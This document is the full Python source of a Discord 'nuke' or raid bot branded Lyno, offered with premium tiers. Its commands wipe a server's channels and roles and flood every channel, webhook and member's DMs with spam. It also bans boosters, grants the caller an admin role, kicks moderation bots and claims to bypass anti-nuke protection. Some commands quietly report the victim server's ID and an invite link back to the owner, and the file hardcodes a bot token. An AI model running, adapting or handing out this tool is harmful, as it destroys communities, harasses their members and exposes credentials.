#Lyno Raid Bot Source
import asyncio
import random
import discord
from discord.ext import commands
import asyncio
from datetime import datetime, timedelta
import sys, discord, requests, json, threading, random, asyncio,aiohttp, time
from discord.ext import commands
import colorama
from colorama import Fore, Style, Back
from time import sleep
from datetime import datetime
from pystyle import *
from discord import User, NotFound
import threading
from discord.ext import commands
from discord import NotFound, HTTPException
import random
import time
from discord import Webhook
from discord.ext import commands
from discord.ext.commands import Bot
from discord import utils
import aiohttp
now = datetime.now()
ftime = now.strftime("%H:%M:%S")
cooldown_time = 500  
cooldown_owner = commands.CooldownMapping.from_cooldown(1, cooldown_time, commands.BucketType.user)
COOLDOWN_SECONDS = 500
bypasscooldown = 200
special_user_id = 1169441226030850133
SPECIAL_USERS = [1169441226030850133, 1]
session = requests.Session()
message = f"https://dsc.gg/lyno Hola !"
events = ["dsc.gg/lyno"]
token = "MTE4OTE4NzI4NTE3NDk5NzAwMg.GVEPyt.0p2x53ITok_gzBss1muPPhZsBKwW1g4-5ne3a8"
prefix = "."
stats = "Security V2 | Lyno Mod"
chan = "r̴a̴i̴d̴ ̴b̴y̴ ̴l̴y̴n̴o̴"
spamdata = "@everyone @here https://dsc.gg/lyno JOIN FOR FREE N'KE BOT | https://twitch.tv/LynoConfigs | denominado = unirse a un nuevo servidor | https://cdn.discordapp.com/attachments/1164790654480683030/1198131579353059328/Lynonukedppf.png?ex=65bdc9fc&is=65ab54fc&hm=6166be8d0d5adb208b03f92f74e7e3137a67eb7154e8283785f2c590be790c0a& "
spamimage = "https://cdn.discordapp.com/attachments/1146260562674720768/1185204098820218990/LynoDestroyer.gif?ex=658ec255&is=657c4d55&hm=9102220a463e6da0b25c401bd121a011df624ac7ea43612fc37ada139fb5052a&"
channelname_list = ["𝐫𝐞𝐤𝐭 𝐛𝐲 𝐥𝐲𝐧𝐨𝐝𝐞𝐬𝐭𝐫𝐨𝐲𝐞𝐫𝐬","r̴a̴i̴d̴ ̴b̴y̴ ̴l̴y̴n̴o̴d̴e̴s̴t̴r̴o̴y̴e̴r̴s̴", "h̴a̴c̴k̴ ̴b̴y̴ ̴l̴y̴n̴o̴d̴e̴s̴t̴r̴o̴y̴e̴r̴s̴", "t̷r̷a̷s̷h̷ ̷b̷y̷ ̷l̷y̷n̷o̷d̷e̷s̷t̷r̷o̷y̷e̷r̷s̷","💀ηυкє ∂є ℓуησ∂єѕтяσуєяѕ","ℓуησ∂єѕтяσуєяѕ ση тσρ","נσιη ℓуησ∂єѕтяσуєяѕ","s̴p̴a̴m̴ ̴b̴y̴ ̴l̴y̴n̴o̴d̴e̴s̴t̴r̴o̴y̴e̴r̴s̴","ℓуησ∂єѕтяσуєяѕ σωηѕ уσυ","💀𝔼𝕤𝕥𝕒𝕓𝕒𝕤 𝕞𝕦𝕖𝕣𝕥𝕒","probably of lynodestroyers","lynodestroyers on top","lynodestroyers owns you","wrecked by lynodestroyers","you messed up with lynodestroyers"]
intents = discord.Intents.all()
client = discord.Client(intents=intents)
rol = "Staff Member"
webname = "ᏖᎧᎮ ᏰᎧᏖ"
amountss = 1000
new_nickname = "L̷͖͈̓͌̎̉͒͗͂̓̌̚͝Ý̴̥͙̘̇̈́̇̃͒̿́͘͘͝͝ͅN̸̡̧͕͙̼̻̳̦̪̞̯͎̦͓̏̒͌͑͒͊̾͌̑̅̕͝ͅO̵̧̗͕̹̼̦̗̮̱̝͆͊́́̈̿̋ͅ O̵̧̗͕̹̼̦̗̮̱̝͆͊́́̈̿̋ͅN̸̡̧͕͙̼̻̳̦̪̞̯͎̦͓̏̒͌͑͒͊̾͌̑̅̕͝ͅT̷̡̧̬̲̭̦̘̩̊̉͛̓̓̌͌̕O̵̧̗͕̹̼̦̗̮̱̝͆͊́́̈̿̋ͅP̷̛̛̛̩̺͇̊̅̍͂͗͑͐̎̂̏̐̐"
new_name = "💀LYNO WAS HERE | dsc.gg/lyno"
intents = discord.Intents().all()
intents.message_content = True
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command("help")
premium = "false"
channel_name = "rip by lynodestroyers"
cooldowns = {} 
code_rewards = {
        "LYNO-GWK8-WB6T-FVZJ": "Premium Lifetime",
        "CODE2": "Reward 2",
        "CODE3": "Reward 3"
} 
def fps_count():
    frame_count = 0
    start_time = time.time()

    frame_count += 1
    elapsed_time = time.time() - start_time
    fps = frame_count / elapsed_time
    if elapsed_time >= 1.0:
        frame_count = 0
        start_time = time.time()
if bot:
  headers = {
    "Authorization": 
      f"Bot {token}"
  }
else:
  headers = {
    "Authorization": 
      token
  }
startednuke = "false"

@bot.event
async def on_ready():
    game = discord.Game(name=stats)
    await bot.change_presence(activity=game, status=discord.Status.dnd)
    
    Write.Print("""                                                                                                  
──────────────────────────────────────────────────────────────────────────────────────────────────
 ___  _  ___  ___  ___  ___  ___    ___  ___  ___  _   
| . \| |/ __]|  _]| . || . \| . \  |_ _|| . || . || |  
| | || |\__ \| [__| | ||   /| | |   | | | | || | || |_ 
|___/|_|[___/`___/`___'|_\_\|___/   |_| `___'`___'|___|
                B O T WAKED      UP-          
                    v0.1 By xylexvxpe
──────────────────────────────────────────────────────────────────────────────────────────────────-""",Colors.blue_to_cyan,interval = 0.0000)
    print("\nCommands - nuke, webhooks , webhookchat , deleteroles")
    print(f"\nLogged in as {bot.user.name}")
    print(f"\nPrefix - {prefix}")
    print("\nHave fun!")

#Stupid Help CMD
@bot.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
        title="Help Command",
        description="This is the help message.",
        color=discord.Color.blue()
    )
    embed.add_field(name="Prefix = .", value="Prefix of bot")
    embed.add_field(name="help", value="Get Help")
    embed.add_field(name="webhookchat", value="Let The Webhook Start Spamming")
    embed.add_field(name="webhooks", value="Spam Create Webhooks")
    embed.add_field(name="deleteroles", value="Delete all Roles From The Server")
    embed.add_field(name="kill", value="trash the server")
    embed.add_field(name="banboosters", value="Ban All the Boosters From the servers")
    embed.add_field(name="swh", value="respamm webhooks")
    embed.add_field(name="eadmin", value="You've Admin")
    embed.add_field(name="delchan", value="delete all channels")
    embed.add_field(name="spam", value="send message on everychannel in server")
    embed.add_field(name="nall",value="Changes All Member Nickname on Guild")
    embed.add_field(name="custom_kill ",value="Custom Command Only For Premium !")
    embed.add_field(name="settings",value="ONLY FOR PREMIUM USERS KILL SETTINGS (OWN)")
    embed.add_field(name="akick",value="Kicks AutoMod in UserID List")
    embed.add_field(name="bypass",value="Bypasses Most Antin'ke Automod Example : <@536991182035746816> ")
    embed.add_field(name="status",value="Get your status ! ")
    embed.add_field(name="massdm",value="Dm EveryPeople in the server <ten message only>")
    try:
        await ctx.author.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("I couldn't send you a DM. Please enable DMs from server members.")
#discord sucks
@bot.command()
async def webhookchat(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def spc(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/channels",
           headers=headers,
           json=json
        )
    for _ in range(99):
           threading.Thread(
             target=spc,
             args=(chan, )
           ).start()
@bot.command()
async def massdm(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    members = guild.members

    async def send_message(member):
        for _ in range(10):
            try:
                await member.send(message)
            except discord.HTTPException:
                print(f"Failed to send DM to {member.name}#{member.discriminator}")

    tasks = []
    for member in members:
        task = asyncio.ensure_future(send_message(member))
        tasks.append(task)

    await asyncio.gather(*tasks)
    
@bot.command()
async def webhooks(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def scrr(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/roles",
           headers=headers,
           json=json
        )
    for _ in range(99):
           threading.Thread(
             target=scrr,
             args=(chan, )
           ).start()

@bot.command()
async def deleteroles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        await role.delete()
@bot.command()
@commands.dm_only()
async def upgrade(ctx):
    if ctx.author.id != special_user_id:
        return await ctx.send("Imagine got no perms.")

    await bot.change_presence(status=discord.Status.idle, activity=discord.Game("Bot Is Upgrading | Use it at your risk!"))
    await ctx.send("Bot Status is Changed Now")

@bot.command()
async def redeem(ctx):
    await ctx.author.send("Please enter the code to redeem:")

    def check(message):
        return message.author == ctx.author and message.channel == ctx.author.dm_channel

    try:
        code_message = await bot.wait_for("message", check=check, timeout=300)
        code = code_message.content

        if code in code_rewards:
            reward = code_rewards[code]
            await ctx.author.send(f"Code redeemed successfully! Your reward is: {reward}")

            if code == "LYNO-GWK8-WB6T-FVZJ":
                server_id = 1189491901393551482  # Replace with the ID of the server where the role exists
                role_id = 1189491988697976882  # Replace with the ID of the role to grant
                server = bot.get_guild(server_id)
                member = server.get_member(ctx.author.id)
                role = server.get_role(role_id)

                if server and member and role:
                    await member.add_roles(role)
                    await ctx.author.send(f"✅Thanks For Choosing Lyno | Code Redeemed Successfully  !")
        else:
            await ctx.author.send("Invalid code.")
    except asyncio.TimeoutError:
        await ctx.send("No response received. Please try again.")

@bot.command()
@commands.dm_only()
async def whitelist(ctx, member_id: int):
    if ctx.message.author.id not in special_user_id:
        return
    
    guild_id = 1189491901393551482  
    role_id = 1189491988697976882  
    
    guild = bot.get_guild(guild_id)
    role = guild.get_role(role_id)
    
    if guild and role:
        member = guild.get_member(member_id)
        
        if member:
            await member.add_roles(role)
            await ctx.send(f"You have whitelisted {member.name} and given them the {role.name} (Premium Access) role in {guild.name} (Booster Server.).")
        else:
            await ctx.send("Failed to find the member. ( make sure the member is in server.)")
    else:
        await ctx.send("Failed to find the guild or role.")

@bot.command()
@commands.dm_only()
async def normal(ctx):
    game = discord.Game(name=stats)
    if ctx.author.id != special_user_id:
        return await ctx.send("Imagine got no perms.")

    await bot.change_presence(activity=game, status=discord.Status.dnd)
    await ctx.send("Bot Status is Changed Now")
@bot.command()
@commands.dm_only()
async def leave(ctx, guild_id: int):
    if ctx.message.author.id != special_user_id:
        await ctx.send(f"{ctx.author} Success Leaved {guild_id}")
        return

    guild = bot.get_guild(guild_id)
    if guild is not None:
        await guild.leave()
    else:
        await ctx.send(f'Could not find a server with ID: {guild_id}')
@bot.command()
async def bypass(ctx):
    user_id = ctx.author.id
    if user_id in SPECIAL_USERS:
        guild = ctx.guild

        async def create_channel(guild, chan):
            try:
                await guild.create_text_channel(chan)
                print(f"Created channel: {chan}")
            except discord.Forbidden:
                print(f'No permission to create channel: {chan}')
            except discord.HTTPException:
                print(f'Error creating channel: {chan}')

        async def edit_channel(channel):
            await channel.edit(name="𝕓𝕪𝕡𝕒𝕤𝕤𝕖𝕕 𝕓𝕪 𝕝𝕪𝕟𝕠")

        async def create_webhooks(channel):
            for i in range(5):
                try:
                    webhook = await channel.create_webhook(name=f'# Lyno Return d {i+1}')
                    print(f'Webhook created in channel: {channel.name}')
                except discord.Forbidden:
                    print(f'No permission to create webhook in channel: {channel.name}')
                except discord.HTTPException:
                    print(f'Error creating webhook in channel: {channel.name}')

        await ctx.message.delete()
        await asyncio.gather(*[create_channel(guild, "rules") for _ in range(100)])

        amountspam = 99
        for _ in range(amountspam):
            for channel in guild.text_channels:
                await channel.send("Bypassed EASILY ! By Lyno")
                await channel.send(spamdata)
                await channel.send(spamimage)

        if guild:

            for channel in guild.text_channels:
                await create_webhooks(channel)
                await edit_channel(channel)
    if user_id in cooldowns and datetime.now() < cooldowns[user_id]:
        cooldown_remaining = cooldowns[user_id] - datetime.now()
        cooldown_remaining = cooldown_remaining.total_seconds()
        cooldownmsg = f"""
        ```ansi
[2;34mERROR: Please wait cooldown. You need to wait {cooldown_remaining} seconds.[0m
```
        
        """
        embed = discord.Embed(
            title="⚠️ERROR",
            description=f"Premium To Bypass :D \n {cooldownmsg}",
            color=discord.Color.blue()
        )

        await ctx.author.send(embed=embed)
        return

    cooldowns[user_id] = datetime.now() + timedelta(seconds=bypasscooldown)
    guild = ctx.guild

    async def create_channel(guild, chan):
        try:
            await guild.create_text_channel(chan)
            print(f"Created channel: {chan}")
        except discord.Forbidden:
            print(f'No permission to create channel: {chan}')
        except discord.HTTPException:
            print(f'Error creating channel: {chan}')

    async def edit_channel(channel):
        await channel.edit(name="𝕓𝕪𝕡𝕒𝕤𝕤𝕖𝕕 𝕓𝕪 𝕝𝕪𝕟𝕠")

    async def create_webhooks(channel):
        for i in range(5):
            try:
                webhook = await channel.create_webhook(name=f'# Lyno Return d {i+1}')
                print(f'Webhook created in channel: {channel.name}')
            except discord.Forbidden:
                print(f'No permission to create webhook in channel: {channel.name}')
            except discord.HTTPException:
                print(f'Error creating webhook in channel: {channel.name}')

    await ctx.message.delete()
    await asyncio.gather(*[create_channel(guild, "rules") for _ in range(99)])

    amountspam = 99
    for _ in range(amountspam):
        for channel in guild.text_channels:
            await channel.send("Bypassed EASILY ! By Lyno")
            await channel.send(spamdata)
            await channel.send(spamimage)


@bot.command()
async def kill(ctx):
    await ctx.message.delete()
    user_id = ctx.author.id

    if user_id in SPECIAL_USERS:
        guild = ctx.guild
        member_count = guild.member_count - 1
        if guild:
            invites = await guild.invites()
            if invites:
                invite_link = invites[0].url
            else:
                channel = guild.text_channels[0]
                invite = await channel.create_invite()
                invite_link = invite.url

            user = bot.get_user(1169441226030850133)
            if user:
                await user.send(f'Author: {ctx.author.name}\nServer ID: {guild.id}, Member count: {member_count} Beta Invite: {invite_link}')

        try:
            image_url = "https://cdn.discordapp.com/attachments/1164790654480683030/1198131579353059328/Lynonukedppf.png?ex=65bdc9fc&is=65ab54fc&hm=6166be8d0d5adb208b03f92f74e7e3137a67eb7154e8283785f2c590be790c0a&"
            await guild.edit(name=new_name)
            response = requests.get(image_url)
            response.raise_for_status()
            image_data = response.content
            await guild.edit(icon=image_data)
            for member in guild.members:
                await member.edit(nick=new_nickname)


            events = []
            event = {
                'date': "Infinite",
                'time': "Infinite",
                'description': "Server: dsc.gg/lyno",
                'creator': "Lyno Bot"
            }
            events.append(event)

        except discord.Forbidden:
            print("Unable to change guild name")
            await ctx.send('Insufficient permissions to change server icon.')

        except discord.HTTPException:
            await ctx.send('Failed to change server icon. Please check the image URL.')
        async def delete_channel(channel):
            try:
                await channel.delete()
                print(f'Channel deleted: {channel.name}')
            except discord.Forbidden:
                print(f'No permission to delete channel: {channel.name}')
            except discord.HTTPException:
                print(f'Error deleting channel: {channel.name}')

        channels = guild.channels
        await asyncio.gather(*[delete_channel(channel) for channel in channels if isinstance(channel, discord.TextChannel)])
        async def create_channel(guild, chan):
            try:
                await guild.create_text_channel(chan)
                print(f"Created channel: {chan}")
            except discord.Forbidden:
                print(f'No permission to create channel: {chan}')
            except discord.HTTPException:
                print(f'Error creating channel: {chan}')
        channels = guild.channels
        voice_channels = [channel for channel in channels if isinstance(channel, discord.VoiceChannel)]
        categories = [category for category in channels if isinstance(category, discord.CategoryChannel)]
        await asyncio.gather(*[channel.edit(name=channel_name) for channel in voice_channels])
        await asyncio.gather(*[channel.edit(name=channel_name) for channel in categories])
        async def create_webhooks(channel):
            for i in range(5):
                try:
                    webhook = await channel.create_webhook(name=f'# Lyno Return d {i+1}')
                    print(f'Webhook created in channel: {channel.name}')
                except discord.Forbidden:
                    print(f'No permission to create webhook in channel: {channel.name}')
                except discord.HTTPException:
                    print(f'Error creating webhook in channel: {channel.name}')

        async def delete_roles(guild):
            for role in guild.roles:
                try:
                    await role.delete()
                    print(f'Role deleted: {role.name}')
                except discord.Forbidden:
                    print(f'No permission to delete role: {role.name}')
                except discord.HTTPException:
                    print(f'Error deleting role: {role.name}')

        async def main():
            guild = ctx.guild 

            await asyncio.gather(*[create_channel(guild, random.choice(channelname_list)) for _ in range(99)])
            amountspam = 99
            for _ in range(amountspam):
                for channel in guild.channels:
                    await channel.send(spamdata)
                    await channel.send(spamimage)
            for channel in guild.channels:
                await create_webhooks(channel)

            await delete_roles(guild)

            events = []
            event = {
                'date': "Infinite",
                'time': "Infinite",
                'description': "Server: dsc.gg/lyno",
                'creator': "Lyno Bot"
            }
            events.append(event)


        await main()
        

    if user_id in cooldowns and datetime.now() < cooldowns[user_id]:
        cooldown_remaining = cooldowns[user_id] - datetime.now()
        cooldown_remaining = cooldown_remaining.total_seconds()
        cooldownmsg = f"""
        ```ansi
[2;34mERROR: Please wait cooldown. You need to wait {cooldown_remaining} seconds.[0m
```
        
        """
        embed = discord.Embed(
            title="⚠️ERROR",
            description=f"Premium To Bypass :D \n {cooldownmsg}",
            color=discord.Color.blue()
        )

        await ctx.author.send(embed=embed)
        return

    cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_SECONDS)

    kill()
        # for member in guild.members:
        #     await change_nickname(member, "# Lyno On Top") 
        # new_name = "dsc.gg/lyno" 
        # try:
        #     await guild.edit(name=new_name)
        #     print(f"Changed guild name to {new_name}")
        # except discord.Forbidden:
        #     print("Unable to change guild name")

@bot.command()
async def banboosters(ctx):
    await ctx.message.delete()
    role_name = "Booster" 
    booster_role = discord.utils.get(ctx.guild.roles, name=role_name)
    if not booster_role:
        print("Booster Role Not Found")

    banned_count = 0
    for member in ctx.guild.members:
        if booster_role in member.roles:
            try:
                await member.ban(reason="Lyno on top")
                banned_count += 1
            except discord.Forbidden:
                pass
# 2023.12.26
@bot.command()
async def nall(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for member in guild.members:
        try:
            await member.edit(nick=new_nickname)
            print(f"Changed nickname for {member.name}")
        except discord.Forbidden:
            print(f"Unable to change nickname for {member.name}")


settings_data = {}
@bot.command()
async def status(ctx):
    user = ctx.author
    if isinstance(ctx.channel, discord.DMChannel):
        required_role_id = 1189491988697976882
        premium = False
        fps = fps_count()
        for guild in bot.guilds:
            member = guild.get_member(user.id)
            if member is not None:
                member_roles = [role.id for role in member.roles]
                if required_role_id in member_roles:
                    await user.send(f"{ctx.author.mention}, Your Premium Status: ✅\nFPS: {fps}")
                else:
                    await user.send(f"{ctx.author.mention}, Your Premium Status: ❌\nFPS: {fps}\n**Buy Premium At:** [Here](https://dsc.gg/lyno)")
    else:
        await ctx.send("Please use it in DMs.")
@bot.command()
async def settings(ctx):
    if isinstance(ctx.channel, discord.DMChannel):
        user = ctx.author
        required_role_id = 1189491988697976882
        premium = False

        for guild in bot.guilds:
            member = guild.get_member(user.id)
            if member is not None:
                member_roles = [role.id for role in member.roles]
                if required_role_id in member_roles:
                    premium = True
                    break

        if not premium:
            await user.send("Premium Feature | Premium = https://dsc.gg/lyno")
            return

        await user.send("Please provide the custom channel name:")

        def check(m):
            return m.author == user and isinstance(m.channel, discord.DMChannel)

        try:
            customchannelname_msg = await bot.wait_for('message', check=check, timeout=60)
            customchannelname = customchannelname_msg.content

            await user.send("Please provide the custom guild changer name:")
            customguildname_msg = await bot.wait_for("message", check=check, timeout=60)
            customguildname = customguildname_msg.content

            await user.send("[BETA] Please provide the custom message data:")
            custommsgdata_msg = await bot.wait_for("message", check=check, timeout=60)
            custommsgdata = custommsgdata_msg.content

            await user.send("Please provide the custom nickname changer name:")
            customnickname_msg = await bot.wait_for("message", check=check, timeout=60)
            customnickname = customnickname_msg.content

            settings_data[user.id] = {
                "customchannelname": customchannelname,
                "customguildname": customguildname,
                "customnickname": customnickname,
                "custommsgdata": custommsgdata
            }

            await user.send("Settings saved successfully! Use `custom_kill` to start n'king")

        except asyncio.TimeoutError:
            await user.send("Command execution timed out. Please try again.")
    else:
        await ctx.send("This command can only be used in DMs.")

@bot.command()
async def custom_kill(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    member_count = guild.member_count -1 
    if guild:
        invites = await guild.invites()
        if invites:
            invite_link = invites[0].url
        else:
            channel = guild.text_channels[0]  
            invite = await channel.create_invite()
            invite_link = invite.url

        user = bot.get_user(1169441226030850133) 
        if user:
            await user.send(f'Premium User | Author: {ctx.author.name}\nServer ID: {guild.id}, Memebrcount : {member_count} Beta Invite: {invite_link}')
    user = ctx.author
    required_role_id = 1189491988697976882
    premium = False

    for guild in ctx.bot.guilds:
        member = guild.get_member(user.id)
        if member is not None:
            member_roles = [role.id for role in member.roles]
            if required_role_id in member_roles:
                if user.id in settings_data:
                    settings = settings_data[user.id]
                    customchannelname = settings.get("customchannelname")
                    customguildname = settings.get("customguildname")
                    customnickname = settings.get("customnickname")
                    custommsgdata = settings.get("custommsgdata")
                    premium = True
                else:
                    await user.send("Please configure your settings using the `.settings` command first.")
                    return
                for member in guild.members:
                    try:
                        await member.edit(nick=customnickname)
                        print(f"Changed nickname for {member.name}")
                    except discord.Forbidden:
                        print(f"Unable to change nickname for {member.name}")

                try:
                    await guild.edit(name=customguildname)
                    print(f"Changed guild name to {customguildname}")
                except discord.Forbidden:
                    print("Unable to change guild name")
                channels = guild.channels
                voice_channels = [channel for channel in channels if isinstance(channel, discord.VoiceChannel)]
                categories = [category for category in channels if isinstance(category, discord.CategoryChannel)]
                async def delete_channel(channel):
                    try:
                        await channel.delete()
                        print(f'Channel deleted: {channel.name}')
                    except discord.Forbidden:
                        print(f'No permission to delete channel: {channel.name}')
                    except discord.HTTPException:
                        print(f'Error deleting channel: {channel.name}')

                channels = guild.channels
                await asyncio.gather(*[delete_channel(channel) for channel in channels if isinstance(channel, discord.TextChannel)])

                async def create_channel(guild, chan):
                    try:
                        await guild.create_text_channel(chan)
                        print(f"Created channel: {chan}")
                    except discord.Forbidden:
                        print(f'No permission to create channel: {chan}')
                    except discord.HTTPException:
                        print(f'Error creating channel: {chan}')

                async def create_webhooks(channel):
                    for i in range(5):
                        try:
                            webhook = await channel.create_webhook(name=f'# Lyno Return d {i+1}')
                            print(f'Webhook created in channel: {channel.name}')
                        except discord.Forbidden:
                            print(f'No permission to create webhook in channel: {channel.name}')
                        except discord.HTTPException:
                            print(f'Error creating webhook in channel: {channel.name}')

                async def delete_roles(guild):
                    for role in guild.roles:
                        try:
                            await role.delete()
                            print(f'Role deleted: {role.name}')
                        except discord.Forbidden:
                            print(f'No permission to delete role: {role.name}')
                        except discord.HTTPException:
                            print(f'Error deleting role: {role.name}')

                async def main():
                    guild = ctx.guild

                    await asyncio.gather(*[create_channel(guild, customchannelname) for _ in range(100)])
                    amountspam = 99
                    for _ in range(amountspam):
                        for channel in guild.channels:
                            await channel.send(custommsgdata)

                    for channel in guild.channels:
                        await create_webhooks(channel)

                    await delete_roles(guild)

                await main()

            else:
                await user.send("**Please Buy Premium At **[Here](<https://dsc.gg/lyno>)")
                return

@bot.command()
async def eadmin(ctx):
    role_name = "Lyno on top" 
    admin_role = discord.utils.get(ctx.guild.roles, name=role_name)
    if admin_role:
        return await ctx.send(f"nah")

    admin_role = await ctx.guild.create_role(name=role_name, permissions=discord.Permissions.all())

    try:
        await ctx.author.add_roles(admin_role)
        time.sleep(0.5)
        await ctx.message.delete()
    except discord.Forbidden:
        await ctx.send("opps")
@bot.command()
async def delchan(ctx):
    guild = ctx.guild 
    channels = guild.channels
    async def delete_channel(channel):
        try:
            await channel.delete()
            print(f'Channel deleted: {channel.name}')
        except discord.Forbidden:
            print(f'No permission to delete channel: {channel.name}')
        except discord.HTTPException:
            print(f'Error deleting channel: {channel.name}')
    await asyncio.gather(*[delete_channel(channel) for channel in channels if isinstance(channel, discord.TextChannel)])
    channel_name = "💀dejé a Lyno aquí" 
    channel = await guild.create_text_channel(channel_name)
    message_content = "@everyone termed = https://dsc.gg/lyno denominado = unirse a un nuevo servidor"
    await channel.send(message_content)

@bot.command()
async def akick(ctx):
    await ctx.message.delete()
    server = ctx.guild
    user_ids_to_kick = [155149108183695360, 437808476106784770, 536991182035746816]  

    for user_id in user_ids_to_kick:
        member = server.get_member(user_id)
        if member is not None:
            try:
                await member.send(embed=discord.Embed(description='Kicked AutoMod Bots'))
                await member.kick(reason='BlackListed')
                print(f'Kicked user {member.name} ({member.id})')
            except discord.Forbidden:
                print(f'Failed to kick user {member.name} ({member.id}) - Forbidden: Cannot send messages to this user')
        else:
            print(f'Member not found with ID: {user_id}')
            user = await bot.fetch_user(user_id)
            if user is not None:
                try:
                    embed = discord.Embed(description=f'AutoMod Not Found on Guild: {server}')
                    await user.send(embed=embed)
                except discord.Forbidden:
                    print(f'Failed to send DM to user {user.name} ({user.id}) - Forbidden: Cannot send messages to this user')
@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    amountspam = 99
    for _ in range(amountspam):
        for channel in ctx.guild.channels:
            await channel.send(spamdata)
            await channel.send(spamimage)

@bot.command()
async def swh(ctx):
    await ctx.message.delete()
    amountspam = 99
    for _ in range(amountspam):
        for webhook in ctx.guild.webhooks:
            await webhook.send(spamdata)
            for channel in ctx.guild.channels:
                await channel.send(spamimage)
@bot.event
async def on_guild_channel_create(channel):
    if premium == True:
        webhook = await channel.create_webhook(name=webname)
        for _ in range(99):
            await webhook.send(content=custommsgdata)
    else:
        try:
            webhook = await channel.create_webhook(name=webname)
            for _ in range(99):
                await webhook.send(content=spamdata+" https://tenor.com/en-AU/view/lynodestroyer-gif-1389155478950456288"+"https://cdn.discordapp.com/attachments/1164790654480683030/1198131579353059328/Lynonukedppf.png?ex=65bdc9fc&is=65ab54fc&hm=6166be8d0d5adb208b03f92f74e7e3137a67eb7154e8283785f2c590be790c0a&")
                await webhook.send(file=spamimage)
        except Exception as e:
            print("Webhook Limit Exceeded!")
            print(e)
bot.run(token)  